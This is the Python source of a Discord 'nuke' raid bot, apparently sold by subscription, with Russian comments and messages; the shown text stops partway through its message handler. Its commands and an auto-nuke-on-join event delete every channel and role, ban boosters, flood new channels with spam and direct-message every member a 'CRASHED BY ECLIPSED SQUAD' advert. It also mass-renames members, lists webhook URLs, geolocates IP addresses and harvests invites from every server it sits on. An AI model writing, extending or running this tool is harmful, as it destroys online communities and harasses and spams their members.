import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp
import json
import os
import logging
import config

# Логирование в файл
logging.basicConfig(
    filename="bot.log",
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    encoding="utf-8"
)
log = logging.getLogger(__name__)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


# ─── HELPERS ───────────────────────────────────────────────

nuke_running = {}
last_spam_text = {}  # guild_id -> последний текст спама
last_nuke_time = {}  # guild_id -> время последнего nuke


def is_whitelisted(user_id):
    return user_id in config.WHITELIST


def is_owner_whitelisted(user_id):
    return user_id in config.OWNER_WHITELIST


def save_whitelist():
    with open("whitelist.json", "w") as f:
        json.dump(config.WHITELIST, f)


def save_owner_whitelist():
    with open("owner_whitelist.json", "w") as f:
        json.dump(config.OWNER_WHITELIST, f)


def load_whitelist():
    if os.path.exists("whitelist.json"):
        with open("whitelist.json", "r") as f:
            config.WHITELIST = json.load(f)
    if os.path.exists("owner_whitelist.json"):
        with open("owner_whitelist.json", "r") as f:
            config.OWNER_WHITELIST = json.load(f)


# ─── BLOCKED GUILDS ────────────────────────────────────────

BLOCKED_GUILDS: list[int] = []


def save_blocked_guilds():
    with open("blocked_guilds.json", "w") as f:
        json.dump(BLOCKED_GUILDS, f)


def load_blocked_guilds():
    global BLOCKED_GUILDS
    if os.path.exists("blocked_guilds.json"):
        with open("blocked_guilds.json", "r") as f:
            BLOCKED_GUILDS = json.load(f)


def is_guild_blocked(guild_id: int) -> bool:
    return guild_id in BLOCKED_GUILDS


def wl_check():
    async def predicate(ctx):
        # Если сервер заблокирован — молча игнорируем
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            await ctx.send("❌ У тебя нет подписки. За покупкой в ЛС Discord: **davaidkatt**")
            return False
        return True
    return commands.check(predicate)


async def delete_all_channels(guild):
    for _ in range(3):  # до 3 попыток
        channels = list(guild.channels)
        if not channels:
            break
        await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
        await asyncio.sleep(1.5)


async def delete_all_roles(guild):
    bot_role = guild.me.top_role
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )


async def do_nuke(guild, spam_text=None):
    if spam_text is None:
        spam_text = config.SPAM_TEXT
    try:
        await guild.edit(name=config.GUILD_NAME)
    except Exception:
        pass

    boosters = [m for m in guild.members if m.premium_since is not None]
    bot_role = guild.me.top_role

    # Удаляем каналы, роли и баним бустеров одновременно
    await asyncio.gather(
        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
        asyncio.gather(*[m.ban(reason="Booster") for m in boosters], return_exceptions=True),
        return_exceptions=True
    )

    # Создаём каналы и сразу спамим в каждый по мере создания
    created_channels = []

    async def create_and_spam(i):
        try:
            if not nuke_running.get(guild.id):
                return
            ch = await guild.create_text_channel(name=config.GUILD_NAME)
            created_channels.append(ch)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)

    nuke_running[guild.id] = False
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


# ─── COMMANDS ──────────────────────────────────────────────

@bot.command()
@wl_check()
async def nuke(ctx, *, text: str = None):
    guild = ctx.guild
    if nuke_running.get(guild.id):
        await ctx.send("Уже запущено.")
        return
    nuke_running[guild.id] = True
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
    last_spam_text[ctx.guild.id] = spam_text

    asyncio.create_task(do_nuke(guild, spam_text))


@bot.command()
@wl_check()
async def stop(ctx):
    nuke_running[ctx.guild.id] = False
    await ctx.send("Остановлено.")


@bot.command()
@wl_check()
async def addch(ctx, count: int = 10, *, name: str = None):
    if count > 500:
        await ctx.send("Максимум 500.")
        return
    ch_name = name if name else config.GUILD_NAME
    results = await asyncio.gather(
        *[ctx.guild.create_text_channel(name=ch_name) for _ in range(count)],
        return_exceptions=True
    )
    done = sum(1 for r in results if not isinstance(r, Exception))
    log.info("!addch %s каналов на %s от %s", done, ctx.guild, ctx.author)
    await ctx.send(f"Создано {done} каналов.")


@bot.command()
@wl_check()
async def cleanup(ctx):
    await delete_all_channels(ctx.guild)
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=False
        )
    }
    for uid in config.WHITELIST:
        member = ctx.guild.get_member(uid)
        if not member:
            try:
                member = await ctx.guild.fetch_member(uid)
            except Exception:
                continue
        overwrites[member] = discord.PermissionOverwrite(
            view_channel=True,
            send_messages=True
        )
    channel = await ctx.guild.create_text_channel("general", overwrites=overwrites)
    # Отправляем текст спама только если nuke был менее 30 секунд назад
    nuke_time = last_nuke_time.get(ctx.guild.id)
    if nuke_time and (asyncio.get_running_loop().time() - nuke_time) <= 30:
        text = last_spam_text.get(ctx.guild.id)
        if text:
            await channel.send(text)


@bot.command()
@wl_check()
@commands.cooldown(1, 30, commands.BucketType.guild)
async def rename(ctx, *, name: str):
    await asyncio.gather(*[c.edit(name=name) for c in ctx.guild.channels], return_exceptions=True)
    await ctx.send("Готово.")


@rename.error
async def rename_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"⏳ Команда на кулдауне. Подожди **{error.retry_after:.0f}** сек.")


@bot.command()
@wl_check()
async def nsfw_all(ctx):
    await asyncio.gather(*[c.edit(nsfw=True) for c in ctx.guild.text_channels], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
@wl_check()
async def unnsfw_all(ctx):
    await asyncio.gather(*[c.edit(nsfw=False) for c in ctx.guild.text_channels], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
@wl_check()
async def invs_delete(ctx):
    invites = await ctx.guild.invites()
    await asyncio.gather(*[i.delete() for i in invites], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
@wl_check()
async def webhooks(ctx):
    whs = await ctx.guild.webhooks()
    if not whs:
        await ctx.send("Вебхуков нет.")
        return
    msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
    await ctx.send(f"```{msg[:1900]}```")


@bot.command()
@wl_check()
async def ip(ctx, address: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"http://ip-api.com/json/{address}") as resp:
            data = await resp.json()
    if data['status'] == 'fail':
        await ctx.send(f"Ошибка: {data['message']}")
        return
    embed = discord.Embed(title=f"IP: {address}", color=discord.Color.blue())
    embed.add_field(name="Страна", value=data.get('country', 'N/A'))
    embed.add_field(name="Город", value=data.get('city', 'N/A'))
    embed.add_field(name="ISP", value=data.get('isp', 'N/A'))
    embed.add_field(name="Координаты", value=f"{data.get('lat')}, {data.get('lon')}")
    await ctx.send(embed=embed)


@bot.command()
@wl_check()
async def nicks_all(ctx, *, nick: str):
    targets = [m for m in ctx.guild.members if m.id not in (ctx.author.id, bot.user.id, ctx.guild.owner_id)]
    await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
@wl_check()
async def auto_nuke(ctx, state: str):
    if state.lower() == "on":
        config.AUTO_NUKE = True
        await ctx.send("✅ Авто-краш включен.")
    elif state.lower() == "off":
        config.AUTO_NUKE = False
        await ctx.send("❌ Авто-краш выключен.")
    elif state.lower() == "info":
        status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключен"
        await ctx.send(f"Авто-краш: {status}")
    else:
        await ctx.send("Используй: `!auto_nuke on` / `!auto_nuke off` / `!auto_nuke info`")


@bot.command()
@wl_check()
async def inv(ctx):
    app_id = bot.user.id
    url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
    await ctx.author.send(f"Добавить бота на сервер: {url}\nДобавить себе: https://discord.com/oauth2/authorize?client_id={app_id}&scope=applications.commands&integration_type=1")



@bot.command(name="wl_add")
@wl_check()
async def wl_add(ctx, user_id: int):
    if user_id not in config.WHITELIST:
        config.WHITELIST.append(user_id)
        save_whitelist()
        await ctx.send(f"✅ `{user_id}` добавлен.")
    else:
        await ctx.send("Уже в whitelist.")


@bot.command(name="wl_remove")
@wl_check()
async def wl_remove(ctx, user_id: int):
    if user_id in config.WHITELIST:
        config.WHITELIST.remove(user_id)
        save_whitelist()
        await ctx.send(f"✅ `{user_id}` убран.")
    else:
        await ctx.send("Не найден.")


@bot.command(name="wl_list")
@wl_check()
async def wl_list(ctx):
    if not config.WHITELIST:
        await ctx.send("Whitelist пуст.")
        return
    await ctx.send("Whitelist:\n" + "\n".join(f"`{uid}`" for uid in config.WHITELIST))


# ─── OWNER-ONLY: BLOCK / UNBLOCK GUILD ─────────────────────

@bot.command(name="block_guild")
async def block_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!block_guild <id>`")
        return
    if gid not in BLOCKED_GUILDS:
        BLOCKED_GUILDS.append(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
    else:
        await ctx.send("Сервер уже заблокирован.")


@bot.command(name="unblock_guild")
async def unblock_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!unblock_guild <id>`")
        return
    if gid in BLOCKED_GUILDS:
        BLOCKED_GUILDS.remove(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔓 Сервер {name_str} разблокирован.")
    else:
        await ctx.send("Сервер не был заблокирован.")


@bot.command(name="blocked_guilds")
async def blocked_guilds_cmd(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    if not BLOCKED_GUILDS:
        await ctx.send("Нет заблокированных серверов.")
        return
    lines = []
    for gid in BLOCKED_GUILDS:
        g = bot.get_guild(gid)
        lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
    await ctx.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))


bot.remove_command("help")


@bot.command(name="help")
@wl_check()
async def help_cmd(ctx):
    embed = discord.Embed(
        title="ArchAngels Bot",
        description=(
            "Все команды бота.\n"
            "⚠️ **Если бот не реагирует на команды** — значит овнер заблокировал его на этом сервере."
        ),
        color=discord.Color.red()
    )
    embed.add_field(
        name="💥 Краш",
        value=(
            "`!nuke [текст]` — удалить все каналы/роли, создать новые и заспамить\n"
            "`!stop` — остановить активный краш\n"
            "`!cleanup` — удалить все каналы, создать один чистый\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота на сервер\n"
            "`!addch [кол-во]` — создать каналы"
        ),
        inline=False
    )
    embed.add_field(
        name="⚙️ Управление",
        value=(
            "`!rename [название]` — переименовать все каналы\n"
            "`!nsfw_all` — включить NSFW во всех каналах\n"
            "`!unnsfw_all` — выключить NSFW во всех каналах\n"
            "`!invs_delete` — удалить все приглашения сервера\n"
            "`!nicks_all [ник]` — сменить ник всем участникам"
        ),
        inline=False
    )
    embed.add_field(
        name="🔧 Утилиты",
        value=(
            "`!webhooks` — показать список всех вебхуков\n"
            "`!ip [адрес]` — получить информацию об IP адресе\n"
            "`!inv` — ссылка для добавления бота\n"
            "`/sp [кол-во] [текст]` — спам сообщением (slash команда)"
        ),
        inline=False
    )
    embed.add_field(
        name="👥 Whitelist",
        value=(
            "`!wl_add [id]` — добавить пользователя в whitelist\n"
            "`!wl_remove [id]` — убрать пользователя из whitelist\n"
            "`!wl_list` — показать список whitelist"
        ),
        inline=False
    )
    embed.set_footer(text="Нет подписки? Пиши в ЛС: davaidkatt")
    await ctx.send(embed=embed)


# ─── EVENTS ────────────────────────────────────────────────

@bot.event
async def on_guild_join(guild):
    if is_guild_blocked(guild.id):
        return  # Сервер заблокирован — ничего не делаем
    if config.AUTO_NUKE:
        nuke_running[guild.id] = True
        asyncio.create_task(do_nuke(guild))

        dm_text = "|| @everyone @here ||\n# CRASHED BY ECLIPSED SQUAD\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9"

        async def dm_all():
            for member in guild.members:
                if member.bot:
                    continue
                try:
                    await member.send(dm_text)
                except Exception:
                    pass
                await asyncio.sleep(0.5)

        asyncio.create_task(dm_all())


# Активный сервер для каждого пользователя в ЛС: user_id -> guild_id
active_guild: dict[int, int] = {}


class GuildSelectView(discord.ui.View):
    def __init__(self, guilds: list[discord.Guild], user_id: int):
        super().__init__(timeout=60)
        self.user_id = user_id
        # Добавляем кнопки (максимум 25)
        for guild in guilds[:25]:
            btn = discord.ui.Button(label=guild.name[:80], custom_id=str(guild.id))
            btn.callback = self.make_callback(guild)
            self.add_item(btn)

    def make_callback(self, guild: discord.Guild):
        async def callback(interaction: discord.Interaction):
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("Не твоя кнопка.", ephemeral=True)
                return
            active_guild[self.user_id] = guild.id
            await interaction.response.edit_message(
                content=f"✅ Активный сервер: **{guild.name}** (`{guild.id}`)\nТеперь все команды в ЛС выполняются на этом сервере.",
                view=None
            )
        return callback


async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_text: str):
    """Выполняет команду от имени владельца на указанном сервере без отправки сообщений в каналы."""
    parts = cmd_text.strip().split(maxsplit=1)
    cmd_name = parts[0].lstrip("!").lower()
    args = parts[1] if len(parts) > 1 else ""

    try:
        # nuke
        if cmd_name == "nuke":
            if nuke_running.get(guild.id):
                await message.channel.send("⚠️ Уже запущено.")
                return
            nuke_running[guild.id] = True
            spam_text = args if args else config.SPAM_TEXT
            last_nuke_time[guild.id] = asyncio.get_running_loop().time()
            last_spam_text[guild.id] = spam_text
            asyncio.create_task(do_nuke(guild, spam_text))
            await message.channel.send(f"✅ `nuke` запущен на **{guild.name}**")

        elif cmd_name == "stop":
            nuke_running[guild.id] = False
            await message.channel.send(f"✅ Остановлено на **{guild.name}**")

        elif cmd_name == "cleanup":
            asyncio.create_task(delete_all_channels(guild))
            await message.channel.send(f"✅ `cleanup` запущен на **{guild.name}**")

        elif cmd_name == "addch":
            try:
                a = args.split(maxsplit=1)
                count = int(a[0]) if a else 10
                name = a[1] if len(a) > 1 else config.GUILD_NAME
            except ValueError:
                count, name = 10, config.GUILD_NAME
            if count > 500:
                await message.channel.send("Максимум 500.")
                return
            asyncio.create_task(asyncio.gather(
                *[guild.create_text_channel(name=name) for _ in range(count)],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Создаю {count} каналов на **{guild.name}**")

        elif cmd_name == "rename":
            if not args:
                await message.channel.send("Укажи название: `!rename <название>`")
                return
            asyncio.create_task(asyncio.gather(
                *[c.edit(name=args) for c in guild.channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Переименовываю каналы на **{guild.name}**")

        elif cmd_name == "nsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=True) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW включён на **{guild.name}**")

        elif cmd_name == "unnsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=False) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW выключен на **{guild.name}**")

        elif cmd_name == "invs_delete":
            invites = await guild.invites()
            asyncio.create_task(asyncio.gather(
                *[i.delete() for i in invites],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Инвайты удалены на **{guild.name}**")

        elif cmd_name == "nicks_all":
            if not args:
                await message.channel.send("Укажи ник: `!nicks_all <ник>`")
                return
            targets = [m for m in guild.members if m.id not in (message.author.id, bot.user.id, guild.owner_id)]
            asyncio.create_task(asyncio.gather(
                *[m.edit(nick=args) for m in targets],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Меняю ники на **{guild.name}**")

        elif cmd_name == "webhooks":
            whs = await guild.webhooks()
            if not whs:
                await message.channel.send("Вебхуков нет.")
                return
            msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
            await message.channel.send(f"```{msg[:1900]}```")

        elif cmd_name == "auto_nuke":
            state = args.lower()
            if state == "on":
                config.AUTO_NUKE = True
                await message.channel.send("✅ Авто-краш включён.")
            elif state == "off":
                config.AUTO_NUKE = False
                await message.channel.send("❌ Авто-краш выключён.")
            elif state == "info":
                status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключён"
                await message.channel.send(f"Авто-краш: {status}")
            else:
                await message.channel.send("Используй: `!auto_nuke on/off/info`")

        elif cmd_name in ("wl_add",):
            if not args:
                await message.channel.send("Использование: `!wl_add <id>`")
                return
            try:
                uid = int(args.strip())
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в whitelist.")
                else:
                    await message.channel.send("Уже в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_add <id>`")

        elif cmd_name in ("wl_remove",):
            if not args:
                await message.channel.send("Использование: `!wl_remove <id>`")
                return
            try:
                uid = int(args.strip())
                if uid in config.WHITELIST:
                    config.WHITELIST.remove(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из whitelist.")
                else:
                    await message.channel.send("Не найден в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_remove <id>`")

        elif cmd_name in ("wl_list",):
            if not config.WHITELIST:
                await message.channel.send("Whitelist пуст.")
            else:
                await message.channel.send("Whitelist:\n" + "\n".join(f"`{uid}`" for uid in config.WHITELIST))

        elif cmd_name == "inv":
            app_id = bot.user.id
            url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
            await message.channel.send(f"Добавить бота: {url}")

        elif cmd_name == "block_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован.")
            else:
                await message.channel.send("Сервер уже заблокирован.")

        elif cmd_name == "unblock_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")

        elif cmd_name == "blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))

        else:
            await message.channel.send(f"❌ Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")

    except Exception as e:
        await message.channel.send(f"❌ Ошибка: {e}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # ── Управление через ЛС ──────────────────────────────────
    if isinstance(message.channel, discord.DMChannel) and is_whitelisted(message.author.id):
        content = message.content.strip()

        # !help — показать help прямо в ЛС
        if content == "!help":
            embed = discord.Embed(
                title="ArchAngels Bot",
                description=(
                    "Все команды бота.\n"
                    "⚠️ **Если бот не реагирует на команды на каком-то сервере** — значит овнер заблокировал его там."
                ),
                color=discord.Color.red()
            )
            embed.add_field(
                name="💥 Краш",
                value=(
                    "`!nuke [текст]` — удалить все каналы/роли, создать новые и заспамить\n"
                    "`!stop` — остановить активный краш\n"
                    "`!cleanup` — удалить все каналы, создать один чистый\n"
                    "`!auto_nuke on/off/info` — авто-краш при входе бота на сервер\n"
                    "`!addch [кол-во]` — создать каналы"
                ),
                inline=False
            )
            embed.add_field(
                name="⚙️ Управление",
                value=(
                    "`!rename [название]` — переименовать все каналы\n"
                    "`!nsfw_all` — включить NSFW во всех каналах\n"
                    "`!unnsfw_all` — выключить NSFW во всех каналах\n"
                    "`!invs_delete` — удалить все приглашения сервера\n"
                    "`!nicks_all [ник]` — сменить ник всем участникам"
                ),
                inline=False
            )
            embed.add_field(
                name="🔧 Утилиты",
                value=(
                    "`!webhooks` — показать список всех вебхуков\n"
                    "`!ip [адрес]` — получить информацию об IP адресе\n"
                    "`!inv` — ссылка для добавления бота\n"
                    "`/sp [кол-во] [текст]` — спам сообщением\n"
                    "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
                ),
                inline=False
            )
            embed.add_field(
                name="👥 Whitelist",
                value=(
                    "`!wl_add [id]` — добавить пользователя в whitelist\n"
                    "`!wl_remove [id]` — убрать пользователя из whitelist\n"
                    "`!wl_list` — показать список whitelist"
                ),
                inline=False
            )
            embed.set_footer(text="Нет подписки? Пиши в ЛС: davaidkatt")
            await message.channel.send(embed=embed)
            return

        # !owner_help — список всех ЛС-команд (только OWNER_ID)
        if content == "!owner_help":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Нет доступа.")
                return
            embed = discord.Embed(
                title="👑 Owner Panel",
                description=(
                    "Управление ботом через личные сообщения.\n"
                    "Все команды работают только для тебя — никто другой не имеет доступа к этому меню."
                ),
                color=discord.Color.gold()
            )
            embed.add_field(
                name="🖥️ Выбор сервера",
                value=(
                    "`!guilds` — список всех серверов бота (с кнопками выбора)\n"
                    "`!setguild <id>` — выбрать сервер вручную по ID\n"
                    "`!invlink` — получить инвайт-ссылки со всех серверов"
                ),
                inline=False
            )
            embed.add_field(
                name="⚙️ Команды на выбранном сервере",
                value=(
                    "Сначала выбери сервер через `!guilds` или `!setguild`, затем пиши команды:\n"
                    "`!nuke [текст]` · `!stop` · `!cleanup` · `!addch [кол-во]`\n"
                    "`!rename [название]` · `!nsfw_all` · `!unnsfw_all`\n"
                    "`!invs_delete` · `!nicks_all [ник]` · `!webhooks`\n"
                    "`!auto_nuke on/off/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="🔒 Блокировка серверов",
                value=(
                    "Запрещает боту выполнять **любые команды** на указанном сервере.\n"
                    "Удобно если бот стоит у тебя на сервере — заблокируй его и никто из вайтлиста не сможет им воспользоваться там.\n\n"
                    "`!block_guild <id>` — заблокировать сервер\n"
                    "`!unblock_guild <id>` — снять блокировку\n"
                    "`!blocked_guilds` — список заблокированных серверов"
                ),
                inline=False
            )
            embed.add_field(
                name="👑 Owner Whitelist",
                value=(
                    "Расширенный список доверенных пользователей (управляется только тобой).\n"
                    "`!owl_add <id>` — добавить\n"
                    "`!owl_remove <id>` — убрать\n"
                    "`!owl_list` — показать список"
                ),
                inline=False
            )
            embed.add_field(
                name="👥 Whitelist (подписчики)",
                value=(
                    "Пользователи из этого списка могут пользоваться ботом на любом сервере.\n"
                    "`!wl_add <id>` — добавить\n"
                    "`!wl_remove <id>` — убрать\n"
                    "`!wl_list` — показать список"
                ),
                inline=False
            )
            embed.set_footer(text="Команды работают только в ЛС с ботом")
            await message.channel.send(embed=embed)
            return

        # !owl_add <id> — добавить в owner whitelist (только OWNER_ID)
        if content.startswith("!owl_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid not in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.append(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в owner whitelist.")
                else:
                    await message.channel.send("Уже в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_add <id>`")
            return

        # !owl_remove <id> — убрать из owner whitelist (только OWNER_ID)
        if content.startswith("!owl_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.remove(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из owner whitelist.")
                else:
                    await message.channel.send("Не найден в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_remove <id>`")
            return

        # !owl_list — показать owner whitelist (только OWNER_ID)
        if content == "!owl_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может смотреть owner whitelist.")
                return
            if not config.OWNER_WHITELIST:
                await message.channel.send("Owner whitelist пуст.")
            else:
                await message.channel.send("Owner whitelist:\n" + "\n".join(f"`{uid}`" for uid in config.OWNER_WHITELIST))
            return

        # !guilds — показать список серверов с кнопками выбора
        if content == "!guilds":
            guilds = list(bot.guilds)
            if not guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
            view = GuildSelectView(guilds, message.author.id)
            current = active_guild.get(message.author.id)
            current_name = bot.get_guild(current).name if current and bot.get_guild(current) else "не выбран"
            await message.channel.send(
                f"Серверы бота (активный: **{current_name}**):\n{lines}\n\nВыбери сервер кнопкой:",
                view=view
            )
            return

        # !invlink — прислать инвайт-ссылки со всех серверов
        if content == "!invlink":
            if not bot.guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = []
            for g in bot.guilds:
                try:
                    ch = next((c for c in g.text_channels if c.permissions_for(g.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
                        lines.append(f"**{g.name}** — {inv.url}")
                    else:
                        lines.append(f"**{g.name}** — нет прав на создание инвайта")
                except Exception as e:
                    lines.append(f"**{g.name}** — ошибка: {e}")
            await message.channel.send("\n".join(lines))
            return

        # !setguild <id> — выбрать сервер вручную по ID
        if content.startswith("!setguild "):
            try:
                gid = int(content.split()[1])
                guild = bot.get_guild(gid)
                if not guild:
                    await message.channel.send("Сервер не найден.")
                    return
                active_guild[message.author.id] = gid
                await message.channel.send(f"✅ Активный сервер: **{guild.name}**")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!setguild <id>`")
            return

        # !block_guild [id] — заблокировать сервер (только OWNER_ID)
        if content.startswith("!block_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
            else:
                await message.channel.send("Сервер уже заблокирован.")
            return

        # !unblock_guild [id] — разблокировать сервер (только OWNER_ID)
        if content.startswith("!unblock_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")
            return

        # !blocked_guilds — список заблокированных серверов (только OWNER_ID)
        if content == "!blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))
            return

        # Любая другая команда — выполняем на активном сервере
        # Служебные ЛС-команды никогда не отправляются на сервер
        DM_ONLY_COMMANDS = (
            "!help", "!owner_help", "!guilds", "!invlink",
            "!owl_add", "!owl_remove", "!owl_list",
            "!setguild", "!block_guild", "!unblock_guild", "!blocked_guilds",
        )
        if any(content == cmd or content.startswith(cmd + " ") for cmd in DM_ONLY_COMMANDS):
            return

        if content.startswith("!") and content != "!":
            gid = active_guild.get(message.author.id)
            if not gid:
                # Сервер не выбран — предлагаем выбрать
                guilds = list(bot.guilds)
                if not guilds:
                    await message.channel.send("Бот не на серверах.")
                    return
                lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
                view = GuildSelectView(guilds, message.author.id)
                await message.channel.send(
                    f"Сервер не выбран. Выбери на каком выполнить `{content}`:\n{lines}",
                    view=view
                )
